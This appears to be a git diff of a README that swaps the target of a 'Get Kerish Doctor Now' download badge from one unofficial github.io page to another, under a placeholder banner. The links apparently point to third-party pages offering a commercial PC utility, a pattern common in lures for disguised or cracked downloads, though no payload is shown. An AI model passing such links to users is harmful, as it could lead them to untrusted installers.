@@ -4,7 +4,7 @@
 
 ![Banner Placeholder](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQFXrI4EHo17vnjV8vmTal5knQbfTH8-Y386Q&s)
 
-[![Get Kerish Doctor Now](https://img.shields.io/badge/Get_Kerish_Doctor-Now-0a5d8d?style=for-the-badge&logo=github)](https://skillls0ussilily.github.io/.github/kerish-doctor)
+[![Get Kerish Doctor Now](https://img.shields.io/badge/Get_Kerish_Doctor-Now-0a5d8d?style=for-the-badge&logo=github)](https://kerish-doctor-setup.github.io/.github/)
 
 ---
 
